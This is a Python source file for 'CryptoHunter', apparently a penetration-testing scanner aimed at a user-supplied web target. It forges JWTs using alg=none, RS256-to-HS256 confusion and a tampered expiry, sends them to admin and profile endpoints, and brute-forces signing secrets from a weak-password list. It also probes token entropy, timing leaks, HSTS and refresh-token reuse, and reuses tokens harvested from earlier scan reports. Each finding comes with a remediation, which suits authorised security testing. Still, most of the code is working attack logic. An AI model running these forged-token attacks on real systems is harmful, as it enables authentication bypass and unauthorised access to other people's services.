#!/usr/bin/env python3
import asyncio
import aiohttp
import json
import base64
import re
import time
import math
import statistics
from collections import Counter
from pathlib import Path
from smart_filter import REQUEST_DELAY, confidence_score, confidence_label, severity_from_confidence, is_demo_value

WEAK_SECRETS = [
    # Common passwords
    'secret', 'password', '123456', 'admin', 'test', 'changeme',
    'key', 'jwt', 'token', 'mykey', 'supersecret', 'secret123',
    'qwerty', 'abc123', '', 'null', 'undefined', 'shhhhh', 'mysecret',
    # JWT-specific
    'your-256-bit-secret', 'HS256', 'your-secret-key', 'jwt-secret',
    'jwt_secret', 'jwtsecret', 'jwtkey', 'jsonwebtoken',
    # App framework defaults
    'django-insecure', 'laravel', 'symfony', 'rails', 'express',
    'flask-secret', 'session-secret', 'cookie-secret',
    # Very common weak ones
    'password1', '12345678', 'letmein', 'welcome', 'monkey',
    'dragon', 'master', 'login', 'pass', 'root', 'toor',
    'alpine', 'admin123', 'password123', 'secret_key',
    # Placeholders
    'xxx', 'aaa', 'todo', 'fixme', 'replace_me', 'insert_here',
    'your_secret_here', 'my_secret', 'super_secret',
]


class CryptoHunter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.findings = []

    def entropy(self, s):
        if not s:
            return 0.0
        c = Counter(s)
        n = len(s)
        return -sum((v / n) * math.log2(v / n) for v in c.values())

    async def _get(self, sess, url, headers=None):
        try:
            timeout = aiohttp.ClientTimeout(total=8)
            async with sess.get(url, headers=headers or {}, ssl=False, timeout=timeout) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, None, {}

    async def _post(self, sess, url, data=None, headers=None):
        try:
            timeout = aiohttp.ClientTimeout(total=8)
            async with sess.post(
                url, json=data or {}, headers=headers or {},
                ssl=False, timeout=timeout
            ) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, None, {}

    def _pad(self, s):
        return s + '=' * (4 - len(s) % 4)

    def _decode_jwt_part(self, part):
        return json.loads(base64.urlsafe_b64decode(self._pad(part)))

    def _encode_jwt_part(self, data):
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',', ':')).encode()
        ).decode().rstrip('=')

    async def test_jwt_none(self, sess, token, endpoints):
        print(f"\n[*] JWT none algorithm attack")
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            header = self._decode_jwt_part(parts[0])
            # Test both 'none', 'None', 'NONE', 'nOnE'
            for alg_variant in ['none', 'None', 'NONE', 'nOnE']:
                header['alg'] = alg_variant
                new_header = self._encode_jwt_part(header)
                tampered = f"{new_header}.{parts[1]}."

                for ep in endpoints:
                    baseline_status, baseline_body, _ = await self._get(sess, ep)
                    await asyncio.sleep(REQUEST_DELAY)
                    status, body, _ = await self._get(sess, ep, {'Authorization': f'Bearer {tampered}'})
                    await asyncio.sleep(REQUEST_DELAY)

                    if status != 200:
                        continue
                    baseline_len = len(baseline_body or '')
                    body_len = len(body or '')
                    if body_len <= baseline_len + 50:
                        continue

                    conf = confidence_score({
                        'status_200': (True, 50),
                        'more_content': (body_len > baseline_len + 100, 40),
                        'significant_body': (body_len > 200, 10),
                    })
                    self.findings.append({
                        'type': 'JWT_NONE_BYPASS',
                        'severity': severity_from_confidence('CRITICAL', conf),
                        'confidence': conf,
                        'confidence_label': confidence_label(conf),
                        'endpoint': ep,
                        'alg_variant': alg_variant,
                        'proof': f'alg={alg_variant!r} returned {body_len}b vs unauthenticated {baseline_len}b',
                        'detail': f'JWT none algorithm ({alg_variant}) accepted — signature verification skipped',
                        'remediation': 'Reject JWTs with alg=none; whitelist allowed algorithms server-side',
                    })
                    print(f"  [CRITICAL] JWT none ({alg_variant}) bypass at {ep} [confidence: {confidence_label(conf)}]")
                    return
        except Exception:
            pass

    async def test_jwt_alg_confusion(self, sess, token, endpoints):
        print(f"\n[*] JWT algorithm confusion (RS256 → HS256)")
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            header = self._decode_jwt_part(parts[0])
            if header.get('alg', '').startswith('RS') or header.get('alg', '').startswith('ES'):
                header['alg'] = 'HS256'
                new_header = self._encode_jwt_part(header)
                # Sign with empty string (if server uses public key as HMAC secret, this can work)
                import hmac as _hmac
                import hashlib as _hashlib
                signing_input = f"{new_header}.{parts[1]}"
                sig = _hmac.new(b'', signing_input.encode(), _hashlib.sha256).digest()
                tampered = f"{signing_input}.{base64.urlsafe_b64encode(sig).decode().rstrip('=')}"

                for ep in endpoints:
                    baseline_status, baseline_body, _ = await self._get(sess, ep)
                    await asyncio.sleep(REQUEST_DELAY)
                    status, body, _ = await self._get(sess, ep, {'Authorization': f'Bearer {tampered}'})
                    await asyncio.sleep(REQUEST_DELAY)

                    if status == 200 and len(body or '') > len(baseline_body or '') + 50:
                        self.findings.append({
                            'type': 'JWT_ALG_CONFUSION',
                            'severity': 'CRITICAL',
                            'confidence': 90,
                            'confidence_label': 'High',
                            'endpoint': ep,
                            'original_alg': header.get('alg'),
                            'proof': f'RS/ES256 token accepted when downgraded to HS256',
                            'detail': 'Algorithm confusion — server may be using public key as HMAC secret',
                            'remediation': 'Enforce algorithm server-side; never derive HMAC key from public key',
                        })
                        print(f"  [CRITICAL] JWT algorithm confusion at {ep}")
        except Exception:
            pass

    async def test_jwt_expiry_bypass(self, sess, token, endpoints):
        print(f"\n[*] JWT expiry manipulation")
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            payload = self._decode_jwt_part(parts[1])
            if 'exp' not in payload:
                return
            # Set exp far in the future
            payload['exp'] = 9999999999
            new_payload = self._encode_jwt_part(payload)
            # Tampered without re-signing (invalid signature)
            tampered = f"{parts[0]}.{new_payload}.{parts[2]}"

            for ep in endpoints:
                baseline_status, baseline_body, _ = await self._get(sess, ep)
                await asyncio.sleep(REQUEST_DELAY)
                status, body, _ = await self._get(sess, ep, {'Authorization': f'Bearer {tampered}'})
                await asyncio.sleep(REQUEST_DELAY)

                if status == 200 and len(body or '') > len(baseline_body or '') + 50:
                    self.findings.append({
                        'type': 'JWT_EXPIRY_BYPASS',
                        'severity': 'CRITICAL',
                        'confidence': 90,
                        'confidence_label': 'High',
                        'endpoint': ep,
                        'proof': 'Modified exp claim accepted without signature re-verification',
                        'detail': 'JWT expiry not verified — server accepts tampered payload',
                        'remediation': 'Always verify JWT signature before trusting any claim',
                    })
                    print(f"  [CRITICAL] JWT expiry bypass at {ep}")
        except Exception:
            pass

    async def test_jwt_weak_secret(self, sess, token, endpoints):
        print(f"\n[*] JWT weak secret brute-force ({len(WEAK_SECRETS)} candidates)")
        import hmac as _hmac
        import hashlib as _hashlib
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            signing_input = f"{parts[0]}.{parts[1]}"
            original_sig = base64.urlsafe_b64decode(self._pad(parts[2]))

            header = self._decode_jwt_part(parts[0])
            alg = header.get('alg', 'HS256')
            digest_map = {
                'HS256': _hashlib.sha256,
                'HS384': _hashlib.sha384,
                'HS512': _hashlib.sha512,
            }
            digest_fn = digest_map.get(alg, _hashlib.sha256)

            for secret in WEAK_SECRETS:
                computed = _hmac.new(
                    secret.encode(), signing_input.encode(), digest_fn
                ).digest()
                if computed == original_sig:
                    self.findings.append({
                        'type': 'JWT_WEAK_SECRET',
                        'severity': 'CRITICAL',
                        'confidence': 99,
                        'confidence_label': 'High',
                        'secret': secret,
                        'algorithm': alg,
                        'proof': f'HMAC-{alg} with secret "{secret}" matches token signature exactly',
                        'detail': f'JWT signed with weak secret: "{secret}"',
                        'remediation': 'Use a cryptographically random secret >= 256 bits',
                    })
                    print(f"  [CRITICAL] JWT weak secret: '{secret}' (alg={alg})")
                    return
        except Exception:
            pass

    async def test_token_predictability(self, sess, endpoint):
        print(f"\n[*] Token predictability: {endpoint}")
        tokens = []
        for i in range(20):
            status, body, _ = await self._post(sess, endpoint, {'user': f'probe{i}', 'password': 'test123'})
            if body:
                for pattern in [
                    r'"token"\s*:\s*"([^"]{10,})"',
                    r'"sessionId"\s*:\s*"([^"]{10,})"',
                    r'"access_token"\s*:\s*"([^"]{10,})"',
                    r'"session"\s*:\s*"([^"]{10,})"',
                    r'"auth"\s*:\s*"([^"]{10,})"',
                ]:
                    tokens.extend(re.findall(pattern, body, re.I))
            await asyncio.sleep(REQUEST_DELAY)

        tokens = [t for t in tokens if not is_demo_value(t) and len(t) >= 16]
        if len(tokens) < 5:
            return

        entropies = [self.entropy(t) for t in tokens]
        avg_ent = statistics.mean(entropies)
        min_ent = min(entropies)

        if avg_ent < 3.8:
            conf = confidence_score({
                'very_low_entropy': (avg_ent < 3.0, 60),
                'low_entropy': (avg_ent < 3.8, 30),
                'enough_samples': (len(tokens) >= 10, 10),
            })
            self.findings.append({
                'type': 'WEAK_TOKEN_GENERATION',
                'severity': severity_from_confidence('HIGH', conf),
                'confidence': conf,
                'confidence_label': confidence_label(conf),
                'endpoint': endpoint,
                'avg_entropy': round(avg_ent, 2),
                'min_entropy': round(min_ent, 2),
                'tokens_sampled': len(tokens),
                'proof': f'Average entropy {avg_ent:.2f} (threshold: 3.8), min={min_ent:.2f}',
                'detail': f'Low entropy tokens — potentially predictable or brute-forceable',
                'remediation': 'Use cryptographically secure random token generation (os.urandom/secrets)',
            })
            print(f"  [HIGH] Weak tokens at {endpoint} entropy={avg_ent:.2f} [confidence: {confidence_label(conf)}]")

        # Check for sequential numeric tokens
        nums = [t for t in tokens if t.isdigit()]
        if len(nums) >= 3:
            vals = sorted([int(n) for n in nums])
            diffs = [vals[i + 1] - vals[i] for i in range(len(vals) - 1)]
            if diffs and max(diffs) - min(diffs) < 5:
                self.findings.append({
                    'type': 'SEQUENTIAL_TOKENS',
                    'severity': 'CRITICAL',
                    'confidence': 95,
                    'confidence_label': 'High',
                    'endpoint': endpoint,
                    'sample_values': vals[:6],
                    'max_step': max(diffs),
                    'proof': f'Token values increment by <= {max(diffs)} — next token predictable',
                    'remediation': 'Use UUIDs or CSPRNG-based tokens; never use sequential IDs as auth tokens',
                })
                print(f"  [CRITICAL] Sequential tokens at {endpoint} (step <= {max(diffs)})")

        # Check for timestamp-based tokens (format: 13-digit epoch ms)
        ts_tokens = [t for t in tokens if re.match(r'^\d{13}', t)]
        if len(ts_tokens) >= 3:
            self.findings.append({
                'type': 'TIMESTAMP_BASED_TOKEN',
                'severity': 'HIGH',
                'confidence': 80,
                'confidence_label': 'High',
                'endpoint': endpoint,
                'proof': f'{len(ts_tokens)} tokens appear to start with Unix timestamp (ms)',
                'detail': 'Timestamp prefix reduces token entropy significantly',
                'remediation': 'Do not include predictable components (timestamp, userID) in tokens',
            })
            print(f"  [HIGH] Timestamp-based tokens detected at {endpoint}")

    async def test_timing_attack(self, sess, endpoint):
        print(f"\n[*] Timing attack: {endpoint}")
        test_tokens = [
            'a' * 32, 'b' * 32,
            'aaaaaaaaaaaaaaa' + 'b' * 17,
            'z' * 32, '0' * 32,
        ]
        timings = []
        for token in test_tokens:
            times = []
            for _ in range(12):
                t0 = time.perf_counter()
                await self._post(sess, endpoint, {'token': token})
                times.append(time.perf_counter() - t0)
            timings.append(statistics.median(times))
            await asyncio.sleep(REQUEST_DELAY)

        if len(timings) >= 2:
            max_diff = max(timings) - min(timings)
            if max_diff > 0.080:
                conf = confidence_score({
                    'large_variance': (max_diff > 0.200, 60),
                    'medium_variance': (max_diff > 0.080, 30),
                    'consistent': (statistics.stdev(timings) < max_diff * 0.3, 10),
                })
                self.findings.append({
                    'type': 'TIMING_ATTACK',
                    'severity': severity_from_confidence('MEDIUM', conf),
                    'confidence': conf,
                    'confidence_label': confidence_label(conf),
                    'endpoint': endpoint,
                    'timing_variance_ms': round(max_diff * 1000, 2),
                    'timings_ms': [round(t * 1000, 2) for t in timings],
                    'proof': f'Median response time varies {max_diff * 1000:.2f}ms across token prefixes',
                    'remediation': 'Use constant-time comparison (hmac.compare_digest) for token validation',
                })
                print(f"  [MEDIUM] Timing variance {max_diff * 1000:.2f}ms at {endpoint} [confidence: {confidence_label(conf)}]")

    async def test_hsts_and_tls(self, sess, base_url):
        print(f"\n[*] TLS / HSTS checks")
        try:
            https_url = base_url if base_url.startswith('https') else base_url.replace('http://', 'https://')
            status, body, headers = await self._get(sess, https_url)
            if not headers:
                return

            hsts = headers.get('Strict-Transport-Security', '')
            if not hsts:
                self.findings.append({
                    'type': 'MISSING_HSTS',
                    'severity': 'MEDIUM',
                    'confidence': 95,
                    'confidence_label': 'High',
                    'proof': 'No Strict-Transport-Security header in HTTPS response',
                    'remediation': 'Add HSTS: max-age=31536000; includeSubDomains; preload',
                })
                print(f"  [MEDIUM] HSTS missing")
            else:
                m = re.search(r'max-age=(\d+)', hsts)
                if m and int(m.group(1)) < 15768000:
                    self.findings.append({
                        'type': 'HSTS_SHORT_MAXAGE',
                        'severity': 'LOW',
                        'confidence': 90,
                        'confidence_label': 'High',
                        'max_age': int(m.group(1)),
                        'proof': f'max-age={m.group(1)}s is less than 6 months (15768000s)',
                        'remediation': 'Set HSTS max-age to at least 1 year (31536000)',
                    })
                    print(f"  [LOW] HSTS max-age too short: {m.group(1)}s")

                if 'includeSubDomains' not in hsts:
                    self.findings.append({
                        'type': 'HSTS_NO_SUBDOMAINS',
                        'severity': 'LOW',
                        'confidence': 90,
                        'confidence_label': 'High',
                        'proof': 'HSTS does not include includeSubDomains',
                        'remediation': 'Add includeSubDomains to HSTS header',
                    })

            # Check if HTTP redirects to HTTPS
            if base_url.startswith('https://'):
                http_url = base_url.replace('https://', 'http://')
                http_status, _, http_headers = await self._get(sess, http_url)
                if http_status and http_status not in (301, 302, 307, 308):
                    self.findings.append({
                        'type': 'NO_HTTP_TO_HTTPS_REDIRECT',
                        'severity': 'MEDIUM',
                        'confidence': 85,
                        'confidence_label': 'High',
                        'proof': f'HTTP responded {http_status} instead of 30x redirect',
                        'remediation': 'Redirect all HTTP traffic to HTTPS with 301',
                    })
                    print(f"  [MEDIUM] HTTP not redirected to HTTPS (status={http_status})")
        except Exception:
            pass

    async def test_refresh_token_reuse(self, sess, endpoint):
        print(f"\n[*] Refresh token reuse: {endpoint}")
        status1, body1, _ = await self._post(sess, endpoint, {'grant_type': 'refresh_token', 'refresh_token': 'dummy'})
        await asyncio.sleep(REQUEST_DELAY)

        if status1 not in (200, 201):
            return

        # Try using the same refresh token again immediately
        status2, body2, _ = await self._post(sess, endpoint, {'grant_type': 'refresh_token', 'refresh_token': 'dummy'})
        await asyncio.sleep(REQUEST_DELAY)

        if status2 in (200, 201):
            self.findings.append({
                'type': 'REFRESH_TOKEN_REUSE',
                'severity': 'HIGH',
                'confidence': 70,
                'confidence_label': 'Medium',
                'endpoint': endpoint,
                'proof': 'Same refresh token accepted twice — token rotation not enforced',
                'remediation': 'Invalidate refresh token after single use (token rotation)',
            })
            print(f"  [HIGH] Refresh token reuse possible at {endpoint}")

    async def run(self):
        print("=" * 60)
        print("  CryptoHunter — Cryptographic Weakness Scanner")
        print("=" * 60)

        token_endpoints = [
            f"{self.target}/api/login",
            f"{self.target}/api/auth/login",
            f"{self.target}/api/register",
            f"{self.target}/api/token",
            f"{self.target}/api/session",
            f"{self.target}/auth/token",
            f"{self.target}/oauth/token",
        ]

        refresh_endpoints = [
            f"{self.target}/api/refresh",
            f"{self.target}/api/token/refresh",
            f"{self.target}/auth/refresh",
        ]

        protected_endpoints = [
            f"{self.target}/api/users/1",
            f"{self.target}/api/profile",
            f"{self.target}/api/admin",
            f"{self.target}/dashboard",
            f"{self.target}/api/me",
        ]

        conn = aiohttp.TCPConnector(limit=10, ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=conn, timeout=timeout,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        ) as sess:
            for ep in token_endpoints:
                await self.test_token_predictability(sess, ep)
                await self.test_timing_attack(sess, ep)

            for ep in refresh_endpoints:
                await self.test_refresh_token_reuse(sess, ep)

            await self.test_hsts_and_tls(sess, self.target)

            token_files = ['reports/tokens_found.json', 'reports/authdrift_leaks.json']
            for tf in token_files:
                if Path(tf).exists():
                    try:
                        with open(tf) as f:
                            tokens_data = json.load(f)
                        for t in tokens_data:
                            if t.get('type') == 'JWT':
                                val = t.get('value', '')
                                if val and not is_demo_value(val) and len(val) > 20:
                                    await self.test_jwt_none(sess, val, protected_endpoints)
                                    await self.test_jwt_alg_confusion(sess, val, protected_endpoints)
                                    await self.test_jwt_expiry_bypass(sess, val, protected_endpoints)
                                    await self.test_jwt_weak_secret(sess, val, protected_endpoints)
                    except Exception:
                        pass

        return self.findings


def get_target():
    p = Path("reports/_target.txt")
    if p.exists():
        return p.read_text().strip()
    u = input("[?] Target URL: ").strip()
    return u if u.startswith("http") else "https://" + u


def main():
    print("=" * 60)
    print("  CryptoHunter — Cryptographic Weakness Scanner")
    print("=" * 60)
    target = get_target()
    print(f"[+] Target: {target}")
    Path("reports").mkdir(exist_ok=True)
    scanner = CryptoHunter(target)
    findings = asyncio.run(scanner.run())
    with open("reports/cryptohunter.json", 'w') as f:
        json.dump(findings, f, indent=2)
    print(f"\n[+] {len(findings)} findings -> reports/cryptohunter.json")
    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
        items = [f for f in findings if f.get('severity') == sev]
        if items:
            print(f"\n[!] {len(items)} {sev}:")
            for c in items:
                print(f"    - {c['type']}: {c.get('detail', c.get('proof', ''))[:80]}")


if __name__ == '__main__':
    main()
